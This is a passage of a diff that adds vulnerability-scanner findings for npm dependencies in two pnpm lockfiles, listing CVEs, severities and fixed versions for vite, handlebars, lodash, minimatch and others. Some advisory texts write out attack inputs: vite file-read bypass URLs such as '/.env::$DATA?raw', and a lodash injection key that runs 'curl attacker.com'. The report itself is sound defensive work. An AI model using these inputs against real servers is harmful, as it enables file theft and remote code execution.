+          Actor / Improper Access Control. Vite's server.fs.deny file-access restriction can be bypassed by   
+          appending ?inline&import or ?raw?import query parameters to any request URL, allowing an attacker to
+          read arbitrary files from the host filesystem — including .env files and TLS private keys — when the
+          dev server is reachable from the network.                                                           
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 4.5.11, 5.4.16, 6.0.13, 6.1.3, 6.2.4
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-30208
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor / Improper Access Control. An attacker who can send HTTP requests to the exposed dev server
+          can read arbitrary files outside the project root by appending trailing query separators (e.g.   
+          ?raw??) to /@fs/ URLs, bypassing server.fs.deny access controls.                                 
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.10, 5.4.15, 6.0.12, 6.1.2, 6.2.3
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-46565
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted   
+          Directory ('Path Traversal'). An attacker can bypass the server.fs.deny file-access blocklist by
+          requesting paths with a trailing /. segment, gaining read access to protected files such as .env
+          secrets and TLS certificates from the Vite dev server.                                          
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 4.5.14, 5.4.19, 6.1.6, 6.2.7, 6.3.4
+          4566┆ vite@5.4.14:
+   
+   ❯❯❯❱ vitest - CVE-2026-47429
+          Severity: CRITICAL                                                                                
+          Affected versions of vitest are vulnerable to Missing Authorization. When the Vitest UI server is 
+          listening, the deprecated isFileServingAllowed check is applied without normalizing the URL before
+          filesystem operations, allowing path traversal that lets an attacker read, write, and execute     
+          arbitrary files outside the project directory.                                                    
+                                                                                                            
+           ▶▶┆ Fixed for vitest at versions: 3.2.6, 4.1.0
+          4597┆ vitest@0.34.6:
+   
+   ❯❯❱ ws - CVE-2026-48779
+          Severity: HIGH                                                                                    
+          Affected versions of ws are vulnerable to Allocation of Resources Without Limits or Throttling /  
+          Excessive Platform Resource Consumption within a Loop / Uncontrolled Resource Consumption. An     
+          attacker can cause memory exhaustion and out-of-memory process termination in ws by sending a high
+          volume of exceptionally small WebSocket fragments and data chunks, forcing excessive allocation of
+          internal frame-buffer wrappers beyond the documented maxPayload limit. The flaw resides in ws     
+          internal frame-reassembly logic, so any application that uses ws to send or receive WebSocket     
+          traffic is affected regardless of how the API is called.                                          
+                                                                                                            
+           ▶▶┆ Fixed for ws at versions: 5.2.5, 6.2.4, 7.5.11, 8.21.0
+          4702┆ ws@8.18.0:
+                               
+    libs/copilot/pnpm-lock.yaml
+    ❯❱ esbuild - GHSA-67mh-4wv8-2f99
+          Severity: MODERATE                                                                                  
+          Affected versions of esbuild are vulnerable to Origin Validation Error. esbuild's development server
+          responds to every request, including Server-Sent Events connections, with `Access-Control-Allow-    
+          Origin: *`. Any website a developer visits can therefore make cross-origin requests to the local dev
+          server and read the responses, leaking bundled source code, source maps, and served file paths.     
+          Starting the dev server via serve() reaches the vulnerable code path.                               
+                                                                                                              
+           ▶▶┆ Fixed for esbuild at version: 0.25.0
+          1447┆ esbuild@0.18.20:
+            ⋮┆----------------------------------------
+          1452┆ esbuild@0.21.5:
+   
+   ❯❯❱ form-data - CVE-2026-12143
+          Severity: HIGH                                                                                      
+          Affected versions of form-data are vulnerable to Improper Neutralization of CRLF Sequences ('CRLF   
+          Injection'). form-data does not escape carriage return, line feed, or double-quote characters in the
+          field name and `filename` option passed to `FormData#append()`. These values are concatenated       
+          directly into the `Content-Disposition` header, so passing untrusted input as a field name or       
+          filename lets an attacker inject CRLF sequences and smuggle additional multipart headers/parts (e.g.
+          overriding backend-trusted fields).                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for form-data at versions: 2.5.6, 3.0.5, 4.0.6
+          1524┆ form-data@4.0.0:
+   
+   ❯❯❯❱ form-data - CVE-2025-7783
+          Severity: CRITICAL                                                                                 
+          Affected versions of form-data are vulnerable to Use of Insufficiently Random Values. form-data    
+          generates its multipart boundary using Math.random(), which is predictable if an attacker can      
+          observe PRNG outputs. By determining the boundary value, an attacker can embed that boundary in a  
+          user-controlled field and inject arbitrary extra parameters into the multipart payload, potentially
+          manipulating or appending fields in downstream HTTP requests.                                      
+                                                                                                             
+           ▶▶┆ Fixed for form-data at versions: 2.5.4, 3.0.4, 4.0.4
+          1524┆ form-data@4.0.0:
+   
+   ❯❯❱ glob - CVE-2025-64756
+          Severity: HIGH                                                                                      
+          Affected versions of glob are vulnerable to Improper Neutralization of Special Elements used in an  
+          OS Command ('OS Command Injection'). A command injection flaw exists in the glob CLI's `-c/--cmd`   
+          option: it invokes the user's command with `shell: true`, passing matched filenames directly to a   
+          shell. An attacker who can place files named with shell metacharacters (e.g. `$(…)`, backticks, `;`,
+          `|`) can inject and execute arbitrary commands under the user or CI process's privileges.           
+                                                                                                              
+           ▶▶┆ Fixed for glob at versions: 10.5.0, 11.1.0
+          1566┆ glob@10.4.5:
+   
+   ❯❯❱ handlebars - CVE-2026-33939
+          Severity: HIGH                                                                                    
+          Affected versions of handlebars are vulnerable to Improper Check for Unusual or Exceptional       
+          Conditions. Handlebars.js is vulnerable to denial of service when compiling attacker-controlled   
+          templates containing decorator syntax such as `{{*n}}`; an unregistered decorator is looked up and
+          immediately invoked, causing an uncaught `TypeError` that can crash the Node.js process.          
+                                                                                                            
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+   ❯❯❱ handlebars - CVE-2026-33938
+          Severity: HIGH                                                                                     
+          Affected versions of handlebars are vulnerable to Access of Resource Using Incompatible Type ('Type
+          Confusion') / Improper Control of Generation of Code ('Code Injection'). Handlebars allows server- 
+          side code execution when a template can mutate the `@partial-block` data frame entry and later     
+          render `{{> @partial-block}}`; a crafted AST injected through writable helper arguments can be     
+          dynamically compiled and executed.                                                                 
+                                                                                                             
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+   ❯❯❯❱ handlebars - CVE-2026-33937
+          Severity: CRITICAL                                                                                  
+          Affected versions of handlebars are vulnerable to Access of Resource Using Incompatible Type ('Type 
+          Confusion') / Improper Control of Generation of Code ('Code Injection'). Handlebars is vulnerable to
+          remote code execution when `Handlebars.compile()` is given a user-controlled pre-parsed AST instead 
+          of a template string. A crafted `NumberLiteral.value` is emitted into generated JavaScript without  
+          sanitization, allowing arbitrary code execution during template compilation.                        
+                                                                                                              
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+   ❯❯❱ handlebars - CVE-2026-33938
+          Severity: HIGH                                                                                     
+          Affected versions of handlebars are vulnerable to Access of Resource Using Incompatible Type ('Type
+          Confusion') / Improper Control of Generation of Code ('Code Injection'). Handlebars allows server- 
+          side code execution when a template can mutate the `@partial-block` data frame entry and later     
+          render `{{> @partial-block}}`; a crafted AST injected through writable helper arguments can be     
+          dynamically compiled and executed.                                                                 
+                                                                                                             
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+   ❯❯❱ handlebars - CVE-2026-33940
+          Severity: HIGH                                                                                      
+          Affected versions of handlebars are vulnerable to Access of Resource Using Incompatible Type ('Type 
+          Confusion') / Improper Control of Generation of Code ('Code Injection'). Handlebars is vulnerable to
+          remote code execution when a user-controlled value is returned by a dynamic partial lookup such as  
+          `{{> (lookup . "key")}}`. A crafted object can bypass partial resolution checks, be treated as a    
+          Handlebars AST, and get compiled and executed on the server.                                        
+                                                                                                              
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+   ❯❯❯❱ handlebars - CVE-2026-33937
+          Severity: CRITICAL                                                                                  
+          Affected versions of handlebars are vulnerable to Access of Resource Using Incompatible Type ('Type 
+          Confusion') / Improper Control of Generation of Code ('Code Injection'). Handlebars is vulnerable to
+          remote code execution when `Handlebars.compile()` is given a user-controlled pre-parsed AST instead 
+          of a template string. A crafted `NumberLiteral.value` is emitted into generated JavaScript without  
+          sanitization, allowing arbitrary code execution during template compilation.                        
+                                                                                                              
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+   ❯❯❱ handlebars - CVE-2026-33939
+          Severity: HIGH                                                                                    
+          Affected versions of handlebars are vulnerable to Improper Check for Unusual or Exceptional       
+          Conditions. Handlebars.js is vulnerable to denial of service when compiling attacker-controlled   
+          templates containing decorator syntax such as `{{*n}}`; an unregistered decorator is looked up and
+          immediately invoked, causing an uncaught `TypeError` that can crash the Node.js process.          
+                                                                                                            
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+   ❯❯❱ handlebars - CVE-2026-33940
+          Severity: HIGH                                                                                      
+          Affected versions of handlebars are vulnerable to Access of Resource Using Incompatible Type ('Type 
+          Confusion') / Improper Control of Generation of Code ('Code Injection'). Handlebars is vulnerable to
+          remote code execution when a user-controlled value is returned by a dynamic partial lookup such as  
+          `{{> (lookup . "key")}}`. A crafted object can bypass partial resolution checks, be treated as a    
+          Handlebars AST, and get compiled and executed on the server.                                        
+                                                                                                              
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          1718┆ js-yaml@4.1.0:
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          1718┆ js-yaml@4.1.0:
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1761┆ lodash@4.17.21:
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1761┆ lodash@4.17.21:
+   
+   ❯❯❱ minimatch - CVE-2026-26996
+          Severity: HIGH                                                                                      
+          Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity.         
+          `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS): if an attacker can supply
+          a glob pattern containing many consecutive `*` wildcards followed by a literal that is absent from  
+          the target string, the generated `RegExp` (many repeated `[^/]*?` groups) can trigger exponential   
+          backtracking in V8, causing a single `minimatch()` call to consume excessive CPU and hang the       
+          process.                                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for minimatch at versions: 10.2.1, 3.1.3, 4.2.4, 5.1.7, 6.2.1, 7.4.7, 8.0.5, 9.0.6
+          1834┆ minimatch@9.0.5:
+   
+   ❯❯❱ minimatch - CVE-2026-27903
+          Severity: HIGH                                                                                      
+          Affected versions of minimatch are vulnerable to Inefficient Algorithmic Complexity. `minimatch()`  
+          can be forced into extreme CPU usage (event loop starvation / DoS) when matching non‑matching paths 
+          against attacker-controlled glob patterns containing multiple non-adjacent `**` (globstar) segments.
+          In `matchOne()`, each globstar triggers unbounded recursive backtracking over all remaining path    
+          suffixes, with no memoization or budget limit, causing binomial/exponential growth in work and      
+          allowing small crafted patterns to stall a Node.js process for seconds to tens of seconds per call. 
+                                                                                                              
+           ▶▶┆ Fixed for minimatch at versions: 10.2.3, 3.1.3, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7
+          1834┆ minimatch@9.0.5:
+   
+   ❯❯❱ minimatch - CVE-2026-27904
+          Severity: HIGH                                                                                     
+          Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity.        
+          `minimatch()` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing        
+          attacker-controlled extglob patterns: nested `*()` or `+()` extglobs are compiled into regexes with
+          nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which can trigger catastrophic backtracking in
+          V8 and stall the Node.js event loop for seconds to minutes when matched against a crafted non-     
+          matching path string.                                                                              
+                                                                                                             
+           ▶▶┆ Fixed for minimatch at versions: 10.2.3, 3.1.4, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7
+          1834┆ minimatch@9.0.5:
+   
+   ❯❯❱ picomatch - CVE-2026-33671
+          Severity: HIGH                                                                                      
+          Affected versions of picomatch are vulnerable to Inefficient Regular Expression Complexity.         
+          Picomatch can compile certain extglob patterns (for example quantified +() and *() forms) into      
+          regular expressions with catastrophic backtracking, causing ReDoS and event-loop blocking when those
+          patterns are compiled or matched                                                                    
+                                                                                                              
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          1983┆ picomatch@2.3.1:
+   
+    ❯❱ qs - CVE-2025-15284
+          Severity: MODERATE                                                                                
+          Affected versions of qs are vulnerable to Improper Input Validation. The `arrayLimit` option in   
+          qs.parse() is not enforced for bracket notation (`a[]=…`), so an attacker can send a query with a 
+          huge number of `a[]` parameters, causing qs to allocate an unbounded array in memory and trigger a
+          denial-of-service via memory exhaustion.                                                          
+                                                                                                            
+           ▶▶┆ Fixed for qs at version: 6.14.1
+          2060┆ qs@6.11.2:
+   
+   ❯❯❱ rollup - CVE-2026-27606
+          Severity: HIGH                                                                                      
+          Affected versions of rollup are vulnerable to Improper Limitation of a Pathname to a Restricted     
+          Directory ('Path Traversal'). Rollup is vulnerable to arbitrary file write via path traversal:      
+          chunk/asset names derived from user-controlled inputs (e.g., CLI named inputs, manual chunk aliases,
+          or malicious plugins) are insufficiently sanitized, allowing `../` sequences to survive and be      
+          passed into `path.resolve` when computing output paths. This lets an attacker escape the configured 
+          output directory and overwrite arbitrary files on the host filesystem that the build process can    
+          write to, potentially leading to persistent RCE by clobbering shell/profile or other                
+          executable/config files.                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for rollup at versions: 2.80.0, 3.30.0, 4.59.0
+          2168┆ rollup@4.24.0:
+   
+   ❯❯❱ vite - CVE-2026-53571
+          Severity: HIGH                                                                                      
+          Affected versions of vite and vite-plus are vulnerable to Exposure of Sensitive Information to an   
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+          Vite's server.fs.deny blocklist—which protects sensitive files such as .env and certificate files   
+          from being served—can be bypassed on Windows using alternate path representations (NTFS Alternate   
+          Data Stream syntax like `/.env::$DATA?raw`, or 8.3 short filenames), allowing an attacker to read   
+          otherwise-denied files when the dev server is exposed to the network.                               
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31486
+          Severity: MODERATE                                                                                 
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized   
+          Actor / Improper Access Control. An attacker on the same network can exploit the server.fs.deny    
+          bypass to read arbitrary files from the server's filesystem, including sensitive files such as .env
+          files, private keys, and source code.                                                              
+                                                                                                             
+           ▶▶┆ Fixed for vite at versions: 4.5.12, 5.4.17, 6.0.14, 6.1.4, 6.2.5
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-32395
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor. An attacker on the network can craft HTTP requests containing '#' in the request-target to
+          bypass Vite's server.fs.deny restrictions and read arbitrary files from the host machine.        
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.13, 5.4.18, 6.0.15, 6.1.5, 6.2.6
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-62522
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted       
+          Directory ('Path Traversal'). Vite's server.fs.deny blocklist—which protects sensitive files such as
+          .env and certificate files from being served—can be bypassed on Windows by appending a trailing     
+          backslash to request URLs, allowing an attacker to read otherwise-denied files.                     
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.21, 6.4.1, 7.0.8, 7.1.11
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31125
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
+          Actor / Improper Access Control. Vite's server.fs.deny file-access restriction can be bypassed by   
+          appending ?inline&import or ?raw?import query parameters to any request URL, allowing an attacker to
+          read arbitrary files from the host filesystem — including .env files and TLS private keys — when the
+          dev server is reachable from the network.                                                           
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 4.5.11, 5.4.16, 6.0.13, 6.1.3, 6.2.4
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-30208
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor / Improper Access Control. An attacker who can send HTTP requests to the exposed dev server
+          can read arbitrary files outside the project root by appending trailing query separators (e.g.   
+          ?raw??) to /@fs/ URLs, bypassing server.fs.deny access controls.                                 
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.10, 5.4.15, 6.0.12, 6.1.2, 6.2.3
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-46565
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted   
+          Directory ('Path Traversal'). An attacker can bypass the server.fs.deny file-access blocklist by
+          requesting paths with a trailing /. segment, gaining read access to protected files such as .env
+          secrets and TLS certificates from the Vite dev server.                                          
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 4.5.14, 5.4.19, 6.1.6, 6.2.7, 6.3.4
+          2449┆ vite@5.4.14:
+   
+   ❯❯❱ ws - CVE-2026-48779
+          Severity: HIGH                                                                                    
+          Affected versions of ws are vulnerable to Allocation of Resources Without Limits or Throttling /  
+          Excessive Platform Resource Consumption within a Loop / Uncontrolled Resource Consumption. An     
+          attacker can cause memory exhaustion and out-of-memory process termination in ws by sending a high
+          volume of exceptionally small WebSocket fragments and data chunks, forcing excessive allocation of
+          internal frame-buffer wrappers beyond the documented maxPayload limit. The flaw resides in ws     
+          internal frame-reassembly logic, so any application that uses ws to send or receive WebSocket     
+          traffic is affected regardless of how the API is called.                                          
+                                                                                                            
+           ▶▶┆ Fixed for ws at versions: 5.2.5, 6.2.4, 7.5.11, 8.21.0
+          2517┆ ws@8.18.0:
+                                    
+    libs/react-client/pnpm-lock.yaml
+    ❯❱ esbuild - GHSA-67mh-4wv8-2f99
+          Severity: MODERATE                                                                                  
+          Affected versions of esbuild are vulnerable to Origin Validation Error. esbuild's development server
+          responds to every request, including Server-Sent Events connections, with `Access-Control-Allow-    
+          Origin: *`. Any website a developer visits can therefore make cross-origin requests to the local dev
+          server and read the responses, leaking bundled source code, source maps, and served file paths.     
+          Starting the dev server via serve() reaches the vulnerable code path.                               
+                                                                                                              
+           ▶▶┆ Fixed for esbuild at version: 0.25.0
+          1045┆ esbuild@0.18.20:
+            ⋮┆----------------------------------------
+          1050┆ esbuild@0.21.5:
+   
+   ❯❯❱ form-data - CVE-2026-12143
+          Severity: HIGH                                                                                      
+          Affected versions of form-data are vulnerable to Improper Neutralization of CRLF Sequences ('CRLF   
+          Injection'). form-data does not escape carriage return, line feed, or double-quote characters in the
+          field name and `filename` option passed to `FormData#append()`. These values are concatenated       
+          directly into the `Content-Disposition` header, so passing untrusted input as a field name or       
+          filename lets an attacker inject CRLF sequences and smuggle additional multipart headers/parts (e.g.
+          overriding backend-trusted fields).                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for form-data at versions: 2.5.6, 3.0.5, 4.0.6
+          1093┆ form-data@4.0.0:
+   
+   ❯❯❯❱ form-data - CVE-2025-7783
+          Severity: CRITICAL                                                                                 
+          Affected versions of form-data are vulnerable to Use of Insufficiently Random Values. form-data    
+          generates its multipart boundary using Math.random(), which is predictable if an attacker can      
+          observe PRNG outputs. By determining the boundary value, an attacker can embed that boundary in a  
+          user-controlled field and inject arbitrary extra parameters into the multipart payload, potentially
+          manipulating or appending fields in downstream HTTP requests.                                      
+                                                                                                             
+           ▶▶┆ Fixed for form-data at versions: 2.5.4, 3.0.4, 4.0.4
+          1093┆ form-data@4.0.0:
+   
+   ❯❯❱ glob - CVE-2025-64756
+          Severity: HIGH                                                                                      
+          Affected versions of glob are vulnerable to Improper Neutralization of Special Elements used in an  
+          OS Command ('OS Command Injection'). A command injection flaw exists in the glob CLI's `-c/--cmd`   
+          option: it invokes the user's command with `shell: true`, passing matched filenames directly to a   
+          shell. An attacker who can place files named with shell metacharacters (e.g. `$(…)`, backticks, `;`,
+          `|`) can inject and execute arbitrary commands under the user or CI process's privileges.           
+                                                                                                              
+           ▶▶┆ Fixed for glob at versions: 10.5.0, 11.1.0
+          1126┆ glob@10.4.5:
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1375┆ lodash@4.17.21:
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1375┆ lodash@4.17.21:
+   
+   ❯❯❱ minimatch - CVE-2026-26996
+          Severity: HIGH                                                                                      
+          Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity.         
+          `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS): if an attacker can supply
+          a glob pattern containing many consecutive `*` wildcards followed by a literal that is absent from  
+          the target string, the generated `RegExp` (many repeated `[^/]*?` groups) can trigger exponential   
+          backtracking in V8, causing a single `minimatch()` call to consume excessive CPU and hang the       
+          process.                                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for minimatch at versions: 10.2.1, 3.1.3, 4.2.4, 5.1.7, 6.2.1, 7.4.7, 8.0.5, 9.0.6
+          1426┆ minimatch@9.0.5:
+   
+   ❯❯❱ minimatch - CVE-2026-27903
+          Severity: HIGH                                                                                      
+          Affected versions of minimatch are vulnerable to Inefficient Algorithmic Complexity. `minimatch()`  
+          can be forced into extreme CPU usage (event loop starvation / DoS) when matching non‑matching paths 
+          against attacker-controlled glob patterns containing multiple non-adjacent `**` (globstar) segments.
+          In `matchOne()`, each globstar triggers unbounded recursive backtracking over all remaining path    
+          suffixes, with no memoization or budget limit, causing binomial/exponential growth in work and      
+          allowing small crafted patterns to stall a Node.js process for seconds to tens of seconds per call. 
+                                                                                                              
+           ▶▶┆ Fixed for minimatch at versions: 10.2.3, 3.1.3, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7
+          1426┆ minimatch@9.0.5:
+   
+   ❯❯❱ minimatch - CVE-2026-27904
+          Severity: HIGH                                                                                     
+          Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity.        
+          `minimatch()` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing        
+          attacker-controlled extglob patterns: nested `*()` or `+()` extglobs are compiled into regexes with
+          nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which can trigger catastrophic backtracking in
+          V8 and stall the Node.js event loop for seconds to minutes when matched against a crafted non-     
+          matching path string.                                                                              
+                                                                                                             
+           ▶▶┆ Fixed for minimatch at versions: 10.2.3, 3.1.4, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7
+          1426┆ minimatch@9.0.5:
+   
+   ❯❯❱ picomatch - CVE-2026-33671
+          Severity: HIGH                                                                                      
+          Affected versions of picomatch are vulnerable to Inefficient Regular Expression Complexity.         
+          Picomatch can compile certain extglob patterns (for example quantified +() and *() forms) into      
+          regular expressions with catastrophic backtracking, causing ReDoS and event-loop blocking when those
+          patterns are compiled or matched                                                                    
+                                                                                                              
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          1519┆ picomatch@2.3.1:
+   
+   ❯❯❱ rollup - CVE-2026-27606
+          Severity: HIGH                                                                                      
+          Affected versions of rollup are vulnerable to Improper Limitation of a Pathname to a Restricted     
+          Directory ('Path Traversal'). Rollup is vulnerable to arbitrary file write via path traversal:      
+          chunk/asset names derived from user-controlled inputs (e.g., CLI named inputs, manual chunk aliases,
+          or malicious plugins) are insufficiently sanitized, allowing `../` sequences to survive and be      
+          passed into `path.resolve` when computing output paths. This lets an attacker escape the configured 
+          output directory and overwrite arbitrary files on the host filesystem that the build process can    
+          write to, potentially leading to persistent RCE by clobbering shell/profile or other                
+          executable/config files.                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for rollup at versions: 2.80.0, 3.30.0, 4.59.0
+          1624┆ rollup@4.24.0:
+   
+   ❯❯❱ socket.io-parser - CVE-2026-33151
+          Severity: HIGH                                                                                   
+          Affected versions of socket.io-parser are vulnerable to Improper Check for Unusual or Exceptional
+          Conditions. A specially crafted packet declaring an unbounded binary attachment count causes the 
+          server to buffer attachments indefinitely, leading to memory exhaustion and Denial of Service    
+                                                                                                           
+           ▶▶┆ Fixed for socket.io-parser at versions: 3.3.5, 3.4.4, 4.2.6
+          1686┆ socket.io-parser@4.2.4:
+   
+   ❯❯❱ vite - CVE-2026-53571
+          Severity: HIGH                                                                                      
+          Affected versions of vite and vite-plus are vulnerable to Exposure of Sensitive Information to an   
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+          Vite's server.fs.deny blocklist—which protects sensitive files such as .env and certificate files   
+          from being served—can be bypassed on Windows using alternate path representations (NTFS Alternate   
+          Data Stream syntax like `/.env::$DATA?raw`, or 8.3 short filenames), allowing an attacker to read   
+          otherwise-denied files when the dev server is exposed to the network.                               
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31486
+          Severity: MODERATE                                                                                 
